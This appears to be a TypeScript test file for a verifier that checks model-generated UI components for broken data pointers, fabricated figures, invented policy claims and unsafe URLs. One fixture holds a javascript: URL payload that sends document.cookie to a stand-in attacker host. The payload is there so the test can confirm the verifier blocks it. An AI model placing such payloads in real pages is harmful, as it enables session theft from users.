import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { Catalog, PhraseBank, ReplayClient } from "@orcawhisperer/lathe-core";
import { verifySurface } from "../src/index.ts";

const TEST_PHRASES = new PhraseBank([
  { key: "order.amount_usd", text: "Charged Amount (USD)" },
  { key: "policy.warning", text: "Policy Advisory" },
  { key: "profile.website", text: "Customer Website" },
]);

const TEST_CATALOG = new Catalog("https://lathe.dev/catalogs/test-guard/v1", [
  {
    name: "Stack",
    description: "Vertical layout container.",
    container: true,
  },
  {
    name: "Stat",
    description: "Numeric KPI metric.",
    props: [
      { name: "value", kind: "binding", valueType: "number", description: "Numeric pointer." },
      { name: "label", kind: "phrase", description: "Label phrase." },
      {
        name: "format",
        kind: "enum",
        description: "Format.",
        options: { currency: "USD currency", integer: "Whole count" },
      },
    ],
  },
  {
    name: "Alert",
    description: "Warning callout banner.",
    props: [
      { name: "message", kind: "binding", valueType: "string", description: "Alert text pointer." },
      { name: "title", kind: "phrase", description: "Banner heading." },
    ],
  },
  {
    name: "LinkButton",
    description: "External navigation link.",
    props: [
      {
        name: "href",
        kind: "binding",
        valueType: "string",
        sink: "url",
        description: "Destination URL pointer.",
      },
      { name: "label", kind: "phrase", description: "Link caption." },
    ],
  },
]);

describe("@lathe/guard 4-tier verifier", () => {
  const baseState = {
    order: {
      duplicate_amount_usd: 184.5,
    },
    compliance: {
      warning_message: "Chargeback window closes within 24 hours.",
    },
    profile: {
      website: "https://acme.example.com/orders/9182",
    },
  };

  it("approves a valid compiled surface across all 4 tiers", async () => {
    const messages = [
      { version: "v0.9", createSurface: { surfaceId: "s1", catalogId: TEST_CATALOG.catalogId } },
      {
        version: "v0.9",
        updateComponents: {
          surfaceId: "s1",
          components: [
            { id: "root", component: "Stack", children: ["c1", "c2", "c3"] },
            {
              id: "c1",
              component: "Stat",
              value: { path: "/order/duplicate_amount_usd" },
              label: "Charged Amount (USD)",
              format: "currency",
            },
            {
              id: "c2",
              component: "Alert",
              message: { path: "/compliance/warning_message" },
              title: "Policy Advisory",
            },
            {
              id: "c3",
              component: "LinkButton",
              href: { path: "/profile/website" },
              label: "Customer Website",
            },
          ],
        },
      },
    ];

    const report = await verifySurface({
      messages,
      state: baseState,
      catalog: TEST_CATALOG,
      phraseBank: TEST_PHRASES,
    });

    assert.equal(report.ok, true);
    assert.equal(report.findings.length, 0);
  });

  it("catches Tier 1 (invalid enum) and Tier 1.5 (broken pointer + fabricated number)", async () => {
    const messages = [
      {
        version: "v0.9",
        updateComponents: {
          surfaceId: "s1",
          components: [
            { id: "root", component: "Stack", children: ["c_bad_ptr", "c_bad_num", "c_bad_enum"] },
            {
              id: "c_bad_ptr",
              component: "Stat",
              value: { path: "/order/invented_field" },
              label: "Charged Amount (USD)",
              format: "currency",
            },
            {
              id: "c_bad_num",
              component: "Alert",
              message: { path: "/compliance/warning_message" },
              title: "Guaranteed $500 Instant Credit",
            },
            {
              id: "c_bad_enum",
              component: "Stat",
              value: { path: "/order/duplicate_amount_usd" },
              label: "Charged Amount (USD)",
              format: "bitcoin",
            },
          ],
        },
      },
    ];

    const report = await verifySurface({
      messages,
      state: baseState,
      catalog: TEST_CATALOG,
      phraseBank: TEST_PHRASES,
    });

    assert.equal(report.ok, false);
    const codes = report.findings.map((f) => f.code);
    assert.ok(codes.includes("broken_pointer"), "Should detect broken JSON Pointer");
    assert.ok(codes.includes("untraced_literal"), "Should detect fabricated $500 number");
    assert.ok(codes.includes("invalid_enum_option"), "Should detect invalid enum option 'bitcoin'");

    // Check that all 3 offending components were stripped from sanitizedMessages
    const sanitizedComps = (
      report.sanitizedMessages[0] as {
        updateComponents: { components: Array<Record<string, unknown>> };
      }
    ).updateComponents.components;
    assert.equal(sanitizedComps.length, 1);
    assert.equal(sanitizedComps[0]!["id"], "root");
    assert.deepEqual(sanitizedComps[0]!["children"], []);
  });

  it("catches Tier 2 (unentailed policy claim via System One Noul) and Tier 4 (javascript: URL & XSS sink)", async () => {
    const poisonedState = {
      ...baseState,
      profile: {
        website: "javascript:fetch('//evil.example/steal?c='+document.cookie)",
      },
    };

    const messages = [
      {
        version: "v0.9",
        updateComponents: {
          surfaceId: "s1",
          components: [
            { id: "root", component: "Stack", children: ["c_hallucinated", "c_xss_url"] },
            {
              id: "c_hallucinated",
              component: "Alert",
              message: { path: "/compliance/warning_message" },
              title: "Full unconditional refund guaranteed immediately by executive override",
            },
            {
              id: "c_xss_url",
              component: "LinkButton",
              href: { path: "/profile/website" },
              label: "Customer Website",
            },
          ],
        },
      },
    ];

    const replay = new ReplayClient({
      answers: {
        entail_c_hallucinated_title: {
          type: "noul",
          noul: 0.02,
          probabilities: { yes: 0.02, no: 0.98 },
        },
      },
    });

    const report = await verifySurface({
      messages,
      state: poisonedState,
      catalog: TEST_CATALOG,
      phraseBank: TEST_PHRASES,
      client: replay,
    });

    assert.equal(report.ok, false);
    const codes = report.findings.map((f) => f.code);
    assert.ok(codes.includes("unentailed_claim"), "Tier 2 should reject invented refund policy");
    assert.ok(codes.includes("unsafe_url_scheme"), "Tier 4 should block javascript: URL in state");
  });
});
